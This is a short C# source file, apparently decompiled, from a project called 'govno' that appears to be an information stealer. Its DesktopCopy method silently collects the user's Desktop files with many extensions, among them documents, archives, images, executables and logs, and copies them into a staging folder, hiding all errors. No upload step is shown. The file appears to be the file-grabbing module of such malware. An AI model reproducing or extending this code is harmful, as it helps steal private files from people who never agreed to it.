using System;
using System.IO;

namespace govno.Features
{
	// Token: 0x0200000E RID: 14
	internal class Desktop
	{
		// Token: 0x0600001D RID: 29 RVA: 0x0000276C File Offset: 0x0000096C
		internal static void DesktopCopy(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
				{
					if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".zip") || !(fileInfo.Extension != ".rar") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".png") || !(fileInfo.Extension != ".jpg") || !(fileInfo.Extension != ".7z") || !(fileInfo.Extension != ".exe") || !(fileInfo.Extension != ".php") || !(fileInfo.Extension != ".rar") || !(fileInfo.Extension != ".html") || !(fileInfo.Extension != ".info") || !(fileInfo.Extension != ".log"))
					{
						Directory.CreateDirectory(directorypath + "\\Desktop\\");
						fileInfo.CopyTo(directorypath + "\\Desktop\\" + fileInfo.Name);
					}
				}
			}
			catch
			{
			}
		}
	}
}
